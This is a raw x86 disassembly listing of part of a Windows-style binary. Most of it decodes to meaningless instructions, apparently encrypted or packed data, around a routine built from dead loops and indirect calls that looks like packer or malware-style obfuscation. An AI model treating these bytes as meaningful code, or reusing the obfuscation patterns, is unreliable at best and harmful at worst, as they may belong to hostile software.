  406964:	adc    ebx,DWORD PTR ss:[edx-0x58]
  406968:	inc    esp
  406969:	es sti 
  40696b:	adc    dl,BYTE PTR [ebx]
  40696d:	push   ds
  40696e:	test   DWORD PTR [ebx+0x136ab227],edi
  406974:	ret    
  406975:	pusha  
  406976:	pop    esi
  406977:	jmp    0x40694e
  406979:	dec    eax
  40697a:	imul   esp,DWORD PTR [edx+0x30],0x9c554340
  406981:	push   eax
  406982:	hlt    
  406983:	and    ebx,DWORD PTR [edi-0x2256fd2e]
  406989:	mov    bh,0xf0
  40698b:	sbb    eax,0x33e6b34e
  406990:	mov    al,ds:0x3b5b1665
  406995:	(bad)  
  406996:	push   esi
  406997:	jno    0x406968
  406999:	outs   dx,BYTE PTR ds:[esi]
  40699a:	inc    edx
  40699b:	stc    
  40699c:	nop
  40699d:	jp     0x4069f9
  40699f:	cs jo  0x4069f8
  4069a2:	xor    BYTE PTR [ecx-0x5d],bh
  4069a5:	push   eax
  4069a6:	jnp    0x4069c1
  4069a8:	cs mov bh,0x58
  4069ab:	mov    edi,DWORD PTR [eax+0x1f]
  4069ae:	imul   edx,eax,0x7da3223
  4069b4:	jo     0x406956
  4069b6:	jns    0x4069c1
  4069b8:	outs   dx,BYTE PTR ds:[esi]
  4069b9:	mov    WORD PTR [ebx],?
  4069bb:	stc    
  4069bc:	pop    esp
  4069bd:	xchg   esi,eax
  4069be:	(bad)  [esi]
  4069c0:	(bad)  
  4069c1:	ds out dx,al
  4069c3:	mov    esi,DWORD PTR [ebx]
  4069c5:	(bad)  
  4069c7:	test   al,0x2b
  4069c9:	push   cs
  4069ca:	pushf  
  4069cb:	push   ebx
  4069cc:	jmp    0x406a44
  4069ce:	mov    cl,0x23
  4069d0:	out    0xd2,eax
  4069d2:	xchg   ebx,eax
  4069d3:	mov    ch,0xda
  4069d5:	mov    al,0xfc
  4069d7:	pop    esi
  4069d8:	push   es
  4069d9:	or     eax,0x15cc7056
  4069de:	jmp    0x4069b4
  4069e0:	mov    al,ds:0x29311d5e
  4069e5:	das    
  4069e6:	into   
  4069e7:	xchg   edi,eax
  4069e8:	mov    BYTE PTR [esi+0x5914df5c],dh
  4069ee:	outs   dx,BYTE PTR ds:[esi]
  4069ef:	mov    ch,0x9b
  4069f1:	jnp    0x4069f0
  4069f3:	mov    ebx,0x9754697d
  4069f8:	adc    al,BYTE PTR [esi]
  4069fa:	sar    BYTE PTR [esi+ecx*8-0x39cad5a4],0x3d
  406a02:	test   DWORD PTR [esi-0x12d69e8d],esi
  406a08:	(bad)  
  406a0a:	mov    ds:0xadbfd9ba,al
  406a0f:	shl    DWORD PTR [esi+0x7f],1
  406a12:	fiadd  DWORD PTR ds:0x19382acd
  406a18:	loope  0x406a1b
  406a1a:	jge    0x4069f3
  406a1c:	gs inc edx
  406a1e:	add    ebx,DWORD PTR [esi-0x70]
  406a21:	pop    eax
  406a22:	loop   0x406a38
  406a24:	lea    esp,[ebp+0x4370169e]
  406a2a:	int    0x2e
  406a2c:	push   0x40ee66c8
  406a31:	and    ebx,esp
  406a33:	sbb    al,0xf3
  406a35:	jns    0x4069c8
  406a37:	xor    BYTE PTR [ecx+0x6c],ch
  406a3a:	or     DWORD PTR [ecx],esp
  406a3c:	push   esp
  406a3d:	xor    al,BYTE PTR [eax]
  406a3f:	adc    BYTE PTR [ebp+0x6f435838],ah
  406a45:	sar    BYTE PTR [ecx],1
  406a47:	or     al,0x8a
  406a49:	or     ch,BYTE PTR [ecx+0xbb94968]
  406a4f:	mov    dh,BYTE PTR [ebp-0x4]
  406a52:	les    esi,FWORD PTR [ebp+0x5b]
  406a55:	test   al,0x7
  406a57:	stc    
  406a58:	imul   edx,DWORD PTR [edi-0x436f11f0],0xcf80a63d
  406a62:	test   al,0x67
  406a64:	ds dec esp
  406a66:	fimul  DWORD PTR [ebx-0x64]
  406a69:	pop    ss
  406a6a:	adc    eax,0x4416a3a8
  406a6f:	in     eax,dx
  406a70:	loop   0x406ac9
  406a72:	sub    ebp,DWORD PTR [esi+edi*1+0x56]
  406a76:	push   edi
  406a77:	mov    esi,0x7df1ad2a
  406a7c:	or     esi,DWORD PTR [eax-0xf]
  406a7f:	xor    al,0x33
  406a81:	icebp  
  406a82:	xchg   esp,eax
  406a83:	je     0x406a06
  406a85:	dec    ebx
  406a86:	pop    ds
  406a87:	(bad)  
  406a88:	out    dx,eax
  406a89:	add    eax,0xf6370e9a
  406a8e:	call   0x78b2:0x24f424f4
  406a95:	or     edx,DWORD PTR [edi+0x8]
  406a98:	or     al,0x47
  406a9a:	add    ch,ah
  406a9c:	xor    eax,0x249da118
  406aa1:	mov    edx,0x86b2c8b6
  406aa6:	data16 fistp DWORD PTR [ebx-0x43]
  406aaa:	xor    ebx,DWORD PTR [ecx+esi*8]
  406aad:	inc    edx
  406aae:	pop    edx
  406aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ab0:	add    eax,0xe418486
  406ab5:	(bad)
  406ab8:	mov    dl,0x71
  406aba:	(bad)  
  406abb:	mov    al,0x8f
  406abd:	and    al,0x2a
  406abf:	sub    eax,0x9c05c133
  406ac4:	jb     0x406af8
  406ac6:	add    cl,cl
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0xbf
  406c9b:	mov    bh,0xa2
  406c9d:	mov    ss,WORD PTR [edi]
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406c29
  406ca7:	aad    0x60
  406ca9:	or     BYTE PTR [ebp-0x31751080],cl
  406caf:	fld    QWORD PTR [esp+ecx*1+0x1fac4e82]
  406cb6:	mov    al,ds:0x75171989
  406cbb:	xor    eax,0xd9f57cad
  406cc0:	sbb    al,0x18
  406cc2:	pop    ds
  406cc3:	mov    al,ds:0xa4711804
  406cc8:	jle    0x406c78
  406cca:	imul   ebp,DWORD PTR [edx],0xffffff80
  406ccd:	add    eax,0xa1f461ca
  406cd2:	mov    eax,0x62b16372
  406cd7:	loop   0x406d40
  406cd9:	jle    0x406d4a
  406cdb:	jle    0x406ccf
  406cdd:	loope  0x406c65
  406cdf:	sub    BYTE PTR [edx+0x65782811],dl
  406ce5:	fst    DWORD PTR [ebp-0x5a]
  406ce8:	xchg   edx,eax
  406ce9:	add    esp,0x17
  406cec:	aaa    
  406ced:	adc    bl,cl
  406cef:	inc    ecx
  406cf0:	(bad)  
  406cf1:	std    
  406cf2:	adc    bl,dl
  406cf4:	das    
  406cf5:	rcr    al,0x79
  406cf8:	sub    ch,BYTE PTR [eax+0x3fad1103]
  406cfe:	(bad)
  406d01:	lea    edx,[edx+0x5f]
  406d04:	leave  
  406d05:	arpl   sp,ax
  406d07:	pop    es
  406d08:	or     BYTE PTR [ebx-0x29c0862c],al
  406d0e:	fisttp WORD PTR [ecx-0x3fae3614]
  406d14:	test   al,0x59
  406d16:	inc    ebp
  406d17:	jmp    0x406d63
  406d19:	in     al,dx
  406d1a:	xor    eax,edi
  406d1c:	push   ebx
  406d1d:	push   ds
  406d1e:	pop    ebp
  406d1f:	stos   DWORD PTR es:[edi],eax
  406d20:	dec    eax
  406d21:	lods   al,BYTE PTR ds:[esi]
  406d22:	adc    bh,bl
  406d24:	daa    
  406d25:	out    dx,eax
  406d26:	sub    esp,DWORD PTR [esi-0x25]
  406d29:	shl    DWORD PTR [ebp-0x3d02377],1
  406d2f:	test   al,0x77
  406d31:	call   0x185355fc
  406d36:	inc    ebx
  406d37:	lahf   
  406d38:	mov    gs,WORD PTR ds:0xd766a78f
  406d3e:	ret    
  406d3f:	fcmovnu st,st(1)
  406d41:	rcl    DWORD PTR [ebx+0xf],cl
  406d44:	inc    esi
  406d45:	fld    DWORD PTR [ecx]
  406d47:	cld    
  406d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d49:	aaa    
  406d4a:	shl    esp,cl
  406d4c:	jp     0x406d12
  406d4e:	mov    al,ds:0xd062a5a6
  406d53:	add    cl,dl
  406d55:	sub    BYTE PTR [ebx+0x381589e],ch
  406d5b:	mov    eax,0x3bf362d
  406d60:	mov    ds:0x968a86ca,al
  406d65:	push   esi
  406d66:	pop    ebp
  406d67:	test   DWORD PTR [ecx+eax*2],edi
  406d6a:	mov    edi,0xb9c3edf
  406d6f:	ret    
  406d70:	mov    edx,0x1472ecc1
  406d75:	sti    
  406d76:	push   ebx
  406d77:	sub    bh,dh
  406d79:	hlt    
  406d7a:	push   es
  406d7b:	in     eax,0xb4
  406d7d:	shl    DWORD PTR [ecx+0x706cb2bc],cl
  406d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d84:	(bad)  
  406d85:	loopne 0x406d7d
  406d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d88:	jmp    0x406d25
  406d8a:	add    ah,BYTE PTR [ecx-0x5bdc6858]
  406d90:	adc    edi,DWORD PTR [esi]
  406d92:	fdecstp 
  406d94:	jb     0x406d6d
  406d96:	test   eax,0xa0c8f1bd
  406d9b:	fmul   QWORD PTR [ebx]
  406d9d:	mov    ah,ah
  406d9f:	hlt    
  406da0:	and    DWORD PTR [ecx],esi
  406da2:	fist   DWORD PTR [ecx+esi*1]
  406da5:	jp     0x406de4
  406da7:	mov    BYTE PTR [edi-0x1472a860],0xaa
  406dae:	mov    esi,0xd5b00600
  406db3:	loop   0x406da1
  406db5:	xor    DWORD PTR ds:0x5dc49d85,0x32283b2c
  406dbf:	sti    
  406dc0:	lock jmp 0x406d51
  406dc3:	sbb    BYTE PTR [edi],cl
  406dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dc6:	and    DWORD PTR [edx+0xa5e6655],ecx
  406dcc:	xchg   ecx,eax
  406dcd:	sbb    eax,DWORD PTR [esi-0x2c]
  406dd0:	xchg   ecx,eax
  406dd1:	aaa    
  406dd2:	fmul   DWORD PTR [ebx+0x2c]
  406dd5:	std    
  406dd6:	shl    dh,0x69
  406dd9:	fisubr WORD PTR [eax-0x6f]
  406ddc:	mov    ?,WORD PTR [esi+0x1b]
  406ddf:	(bad)  [edx+0x4b]
  406de2:	dec    ecx
  406de3:	imul   esi,ebx,0xb42039b9
  406de9:	xchg   ebx,eax
  406dea:	mov    esi,0x7086a56f
  406def:	mov    eax,ds:0xda953aab
  406df4:	test   al,0x7f
  406df6:	mov    al,BYTE PTR [ecx+0x2f54ad7d]
  406dfc:	cmc    
  406dfd:	jg     0x406e2a
  406dff:	pmaddwd mm1,QWORD PTR [esi]
  406e02:	sbb    DWORD PTR [edx+0x4d337c6e],esi
  406e08:	mov    esi,0x47a75eca
  406e0d:	add    al,0xea
  406e0f:	into   
  406e10:	mov    eax,DWORD PTR [eax+0x5a27b71a]
  406e16:	jae    0x406e5e
  406e18:	pop    esi
  406e19:	add    edi,0x55
  406e1c:	mov    BYTE PTR cs:[ebp+0x54fa18c],ch
  406e23:	es mov al,0x5
  406e26:	fimul  WORD PTR [edi-0x17]
  406e29:	cwde   
  406e2a:	hlt    
  406e2b:	mov    ch,0x7c
  406e2d:	push   es
  406e2e:	inc    esi
  406e2f:	(bad)  
  406e30:	fimul  DWORD PTR [ebx+ebp*8]
  406e33:	jns    0x406dd1
  406e35:	xor    eax,0x81e7581c
  406e3a:	jae    0x406e14
  406e3c:	scas   eax,DWORD PTR es:[edi]
  406e3d:	repz call 0x970fa964
  406e43:	call   0x50740aa2
  406e48:	push   es
  406e49:	arpl   WORD PTR es:[ebp-0x769fca5b],di
  406e50:	sbb    edi,DWORD PTR [edi+0x37596ba1]
  406e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e57:	sbb    DWORD PTR [ebp-0x3c],esi
  406e5a:	mov    bl,dh
  406e5c:	call   DWORD PTR [ecx+0x3e609c67]
  406e62:	leave  
  406e63:	ffree  st(0)
  406e65:	es jl  0x406e2d
  406e68:	cmp    DWORD PTR ds:0x3458d6aa,eax
  406e6e:	scas   eax,DWORD PTR es:[edi]
  406e6f:	adc    al,0x5c
  406e71:	es adc al,0xbf
  406e74:	imul   ecx,DWORD PTR [edx],0xffffffac
  406e77:	jmp    0x3feb657d
  406e7c:	mov    dl,0x7
  406e7e:	sub    ecx,DWORD PTR ds:0x9d1010c9
  406e84:	pop    eax
  406e85:	retf   
  406e86:	xor    ah,BYTE PTR [ebp+0x62]
  406e89:	push   es
  406e8a:	cli    
  406e8b:	push   ebx
  406e8c:	fidivr WORD PTR [ecx]
  406e8e:	(bad)  
  406e8f:	xlat   BYTE PTR ds:[ebx]
  406e90:	aaa    
  406e91:	adc    BYTE PTR [eax+0x6],0x58
  406e95:	mov    esp,DWORD PTR [edx-0x1091b7e1]
  406e9b:	ret    
  406e9c:	imul   esi,DWORD PTR ds:0x70b5d013,0x57
  406ea3:	test   DWORD PTR [ecx+0x6eec05c1],ebp
  406ea9:	cld    
  406eaa:	sar    DWORD PTR [esi],cl
  406eac:	push   esp
  406ead:	sbb    eax,0x1b4d309a
  406eb2:	test   al,0x91
  406eb4:	mov    edi,0x9eea5541
  406eb9:	ret    
  406eba:	jo     0x406ea3
  406ebc:	fidivr WORD PTR [esi]
  406ebe:	lods   al,BYTE PTR ds:[esi]
  406ebf:	in     al,dx
  406ec0:	add    esp,eax
  406ec2:	pop    ecx
  406ec3:	aad    0x93
  406ec5:	shl    edx,cl
  406ec7:	sub    esi,DWORD PTR [esi-0x47]
  406eca:	(bad)  
  406ecb:	in     al,0xed
  406ecd:	(bad)  
  406ece:	mov    WORD PTR [ecx],gs
  406ed0:	scas   eax,DWORD PTR es:[edi]
  406ed1:	xor    cl,BYTE PTR [esi]
  406ed3:	rol    BYTE PTR [eax+eax*8],0xf3
  406ed7:	dec    ebx
  406ed8:	scas   al,BYTE PTR es:[edi]
  406ed9:	in     al,0xc8
  406edb:	push   ds
  406edc:	rcl    BYTE PTR [eax+0x77694d35],cl
  406ee2:	out    dx,eax
  406ee3:	mov    ecx,DWORD PTR [edx+0x47]
  406ee6:	sar    BYTE PTR [ebp+0x46902002],1
  406eec:	inc    esi
  406eed:	push   cs
  406eee:	bound  ebp,QWORD PTR [eax+eiz*8+0x54]
  406ef2:	popf   
  406ef3:	shl    DWORD PTR ds:0xf63b8c49,0x58
  406efa:	scas   al,BYTE PTR es:[edi]
  406efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406efc:	and    bh,BYTE PTR [edi]
  406efe:	mov    ecx,0x5b1a4deb
  406f03:	fmul   DWORD PTR [ebx-0x49065a17]
  406f09:	mov    esi,0xa9a41fb8
  406f0e:	and    ecx,ebp
  406f10:	push   es
  406f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f12:	mov    dh,0x2d
  406f14:	test   al,0x6e
  406f16:	(bad)  
  406f17:	cmp    BYTE PTR [ebp+0x3d5b0d],ch
  406f1d:	outs   dx,BYTE PTR ds:[esi]
  406f1e:	out    dx,eax
  406f1f:	xor    BYTE PTR [edx],al
  406f21:	jo     0x406f5f
  406f23:	jae    0x406f56
  406f25:	pop    ss
  406f26:	pop    esi
  406f27:	sbb    BYTE PTR [ecx],0xed
  406f2a:	dec    ebp
  406f2b:	fmul   DWORD PTR [ecx+esi*8+0x147a0c27]
  406f32:	loop   0x406f9f
  406f34:	and    edx,DWORD PTR [esp+esi*4]
  406f37:	mov    dl,0x3c
  406f39:	sbb    dl,BYTE PTR [esi-0x1d]
  406f3c:	mov    ch,0xb7
  406f3e:	adc    ecx,ebp
  406f40:	mov    edx,0x613894c3
  406f45:	das    
  406f46:	push   edx
  406f47:	jmp    0xf594f71b
  406f4c:	jae    0x406f28
  406f4e:	jmp    0xe80aa926
  406f53:	and    dl,BYTE PTR [ecx+0x6538832c]
  406f59:	xor    al,ch
  406f5b:	push   eax
  406f5c:	leave  
  406f5d:	int    0x12
  406f5f:	sub    DWORD PTR [edi+edi*2+0x7dff75ea],ebx
  406f66:	sbb    edi,DWORD PTR [esi-0x24]
  406f69:	adc    eax,0x7e6fe98d
  406f6e:	jmp    0x3b052468
  406f73:	scas   al,BYTE PTR es:[edi]
  406f74:	(bad)
  406f77:	mov    ch,0x8c
  406f79:	js     0x406f51
  406f7b:	jns    0x406f11
  406f7d:	es pop ds
  406f7f:	and    edx,DWORD PTR [ecx-0x17]
  406f82:	lock push ss
  406f84:	xchg   esp,eax
  406f85:	in     al,0x99
  406f87:	adc    eax,ecx
  406f89:	mov    ebp,DWORD PTR [ebx]
  406f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f8c:	jo     0x406f5d
  406f8e:	ror    DWORD PTR [ebx+0x6a],cl
  406f91:	adc    BYTE PTR [edi-0x60],dh
  406f94:	mov    bh,0xbe
  406f96:	push   eax
  406f97:	jmp    0x5f245c47
  406f9c:	sub    dl,BYTE PTR [ecx]
  406f9e:	sbb    BYTE PTR [esi*4+0x72f99751],ch
  406fa5:	loope  0x40700f
  406fa7:	enter  0x98a9,0x13
  406fab:	in     eax,dx
  406fac:	or     dh,bh
  406fae:	mov    bh,0xff
  406fb0:	or     al,0xf7
  406fb2:	push   es
  406fb3:	dec    esp
  406fb4:	adc    BYTE PTR [eax+eax*4+0x1fff5729],ah
  406fbb:	daa    
  406fbc:	test   eax,0x4e90f434
  406fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fc2:	loopne 0x406f99
  406fc4:	dec    esp
  406fc5:	sub    DWORD PTR [eax+ebx*2-0x3],edx
  406fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fca:	or     cl,0x14
  406fcd:	cmp    ebx,edx
  406fcf:	add    edx,DWORD PTR [ebp+0x5e81803e]
  406fd5:	dec    ebx
  406fd6:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406fdd:	adc    DWORD PTR ds:0x42fd72,0x42e70b
  406fe7:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406fee:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406ff5:	add    eax,0xac
  406ffa:	jmp    0x407347
  406fff:	sbb    al,0x75
  407001:	sar    DWORD PTR [esi+0x71b35a51],1
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [ebx],bp
  40700c:	add    al,0x75
  40700e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40700f:	mov    edx,0x7d207070
  407015:	jo     0x407087
  407017:	pop    edx
  407018:	inc    ebx
  407019:	push   es
  40701a:	jecxz  0x407079
  40701c:	sub    BYTE PTR ds:[ecx],ch
  40701f:	js     0x407088
  407021:	daa    
  407022:	xor    ecx,DWORD PTR [edx-0x2e85017f]
  407028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407029:	push   ds
  40702a:	out    dx,eax
  40702b:	xor    edi,DWORD PTR [eax+0xd]
  40702e:	cmp    ah,BYTE PTR [ebx-0x65edc5fa]
  407034:	mov    al,0xda
  407036:	lea    esp,[ebx-0x40]
  407039:	mov    ecx,0x720e52c
  40703e:	stc    
  40703f:	add    DWORD PTR [edi+0x1d],edx
  407042:	add    dh,BYTE PTR [edx+0x3f]
  407045:	mov    ebx,0xf76a9bbc
  40704a:	pusha  
  40704b:	lods   eax,DWORD PTR ds:[esi]
  40704c:	mov    ch,0x3a
  40704e:	push   ecx
  40704f:	shl    DWORD PTR fs:[ebx+0x6288f7de],0xc9
  407057:	nop
  407058:	cmp    esp,DWORD PTR [ebp+ecx*1+0x79]
  40705c:	xlat   BYTE PTR ds:[ebx]
  40705d:	mov    esp,0x7ce42c55
  407062:	push   es
  407063:	dec    edx
  407064:	mov    ecx,eax
  407066:	aam    0x9f
  407068:	fimul  DWORD PTR [esi]
  40706a:	lods   al,BYTE PTR ds:[esi]
  40706b:	ins    BYTE PTR es:[edi],dx
  40706c:	add    eax,0x8e392a98
  407071:	test   al,0xcf
  407073:	shl    BYTE PTR [ecx-0x2610b240],0xda
  40707a:	(bad)  
  40707c:	cmp    al,0xdc
  40707e:	ret    
  40707f:	dec    ecx
  407080:	push   ss
  407081:	and    al,0xae
  407083:	mov    ebx,0xdf8cb5fa
  407088:	push   ebp
  407089:	xchg   ebp,eax
  40708a:	test   DWORD PTR [esp+ecx*1-0x21dfab01],ebx
  407091:	jg     0x407044
  407093:	(bad)  
  407095:	xchg   BYTE PTR [edx+0x34],bh
  407098:	mov    ds:0x870f63ab,eax
  40709d:	xor    BYTE PTR ds:0x54fd9fd2,cl
  4070a3:	mov    es,WORD PTR [edi-0x30]
  4070a6:	inc    edi
  4070a7:	and    al,0x85
  4070a9:	mov    bl,0x50
  4070ab:	dec    esi
  4070ac:	fadd   st,st(1)
  4070ae:	ja     0x407127
  4070b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070b1:	mov    edx,0xfa3d6663
  4070b6:	pop    esi
  4070b7:	stos   DWORD PTR es:[edi],eax
  4070b8:	push   eax
  4070b9:	daa    
  4070ba:	mov    ebx,0x96eb2a42
  4070bf:	stos   BYTE PTR es:[edi],al
  4070c0:	pop    esp
  4070c1:	push   esi
  4070c2:	ins    BYTE PTR es:[edi],dx
  4070c3:	mov    al,ds:0x61f704f4
  4070c8:	call   0x92b59d8b
  4070cd:	int3   
  4070ce:	scas   eax,DWORD PTR es:[edi]
  4070cf:	jle    0x4070d6
  4070d1:	imul   DWORD PTR [edi+0x78afee15]
  4070d7:	sub    al,BYTE PTR [ebx-0xd]
  4070da:	scas   eax,DWORD PTR es:[edi]
  4070db:	iret   
  4070dc:	fwait
  4070dd:	xor    eax,0xe7023f7a
  4070e2:	imul   ebp,esi,0xffffffe0
  4070e5:	push   ss
  4070e6:	push   ss
  4070e7:	xlat   BYTE PTR ds:[ebx]
  4070e8:	imul   edx,ecx,0x14
  4070eb:	lea    edi,[ecx-0xc388b7f]
  4070f1:	pavgw  mm1,QWORD PTR [edx-0x60]
  4070f5:	std    
  4070f6:	jbe    0x407156
  4070f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070f9:	sbb    DWORD PTR [esi-0x4],esi
  4070fc:	shl    DWORD PTR [esi-0x7bd79cb1],0xe4
  407103:	inc    esi
  407104:	lock out 0x2c,eax
  407107:	stos   DWORD PTR es:[edi],eax
  407108:	push   0x1c012dc5
  40710d:	push   ds
  40710e:	xor    bh,BYTE PTR [ecx+0x2f952b0e]
  407114:	inc    ecx
  407115:	add    esi,edi
  407117:	pop    eax
  407118:	ror    DWORD PTR [edi+ecx*2+0x2f],1
  40711c:	xor    eax,0x4662c2c2
  407121:	les    esi,FWORD PTR [ebx-0x19]
  407124:	retf   
  407125:	jl     0x407193
  407127:	pop    ss
  407128:	mov    al,0xef
  40712a:	lods   al,BYTE PTR ds:[esi]
  40712b:	and    DWORD PTR [edi],edi
  40712d:	scas   eax,DWORD PTR es:[edi]
  40712e:	popa   
  40712f:	inc    edi
  407130:	and    eax,0x77107455
  407135:	rcr    BYTE PTR [ebx+ebx*2+0x3640bde9],0x94
  40713d:	hlt    
  40713e:	xor    cl,BYTE PTR [edi]
  407140:	xor    DWORD PTR [eax+0x61720d91],0x7e77e2e9
  40714a:	push   ebx
  40714b:	push   DWORD PTR [edi+0x16]
  40714e:	adc    edi,DWORD PTR [edx+0xa]
  407151:	sbb    dh,BYTE PTR [eax]
  407153:	cld    
  407154:	or     esp,ebp
  407156:	adc    bl,BYTE PTR [eax-0x3897679]
  40715c:	xchg   edi,eax
  40715d:	jge    0x40714a
  40715f:	mov    dl,0x5d
  407161:	cld    
  407162:	xor    al,0xdd
  407164:	test   DWORD PTR [edx+eiz*1],0x96fcc609
  40716b:	or     bh,0xfd
  40716e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40716f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407170:	arpl   WORD PTR [ecx+0x2e],bx
  407173:	jnp    0x4071bc
  407175:	inc    eax
  407176:	inc    edx
  407177:	retf   
  407178:	mov    eax,0xebbdd29f
  40717d:	add    ebx,DWORD PTR [eax]
  40717f:	sub    esp,esi
  407181:	push   esp
  407182:	test   BYTE PTR [edi+edi*1+0x4f],al
  407186:	mov    ebx,0x87a00ec8
  40718b:	js     0x407140
  40718d:	push   ebp
  40718e:	mov    esi,0x50d0652b
  407193:	cli    
  407194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407195:	or     BYTE PTR [ecx],dl
  407197:	sbb    eax,DWORD PTR [edx+ebp*8]
  40719a:	retf   
  40719b:	jae    0x4071b1
  40719d:	test   DWORD PTR [ebx+0x48b84149],edi
  4071a3:	add    al,0x71
  4071a5:	adc    BYTE PTR [esi+0x16],ah
  4071a8:	ror    DWORD PTR [ecx+0x32],1
  4071ab:	lds    eax,FWORD PTR [edi]
  4071ad:	pop    ds
  4071ae:	mov    ds:0x71792123,eax
  4071b3:	and    esp,DWORD PTR [ecx+esi*8-0x3d208452]
  4071ba:	clc    
  4071bb:	test   al,0x20
  4071bd:	lds    esi,FWORD PTR [edx-0x65f01987]
  4071c3:	inc    ebp
  4071c4:	jecxz  0x4071f3
  4071c6:	in     eax,0x7
  4071c8:	popa   
  4071c9:	push   0xd3bc6890
  4071ce:	dec    ecx
  4071cf:	mov    ds:0xc245c150,eax
  4071d4:	int3   
  4071d5:	pop    ss
  4071d6:	push   esp
  4071d7:	inc    esp
  4071d8:	idiv   DWORD PTR [ecx]
  4071da:	aam    0xbc
  4071dc:	ja     0x40721d
  4071de:	pop    edx
  4071df:	loopne 0x4071b0
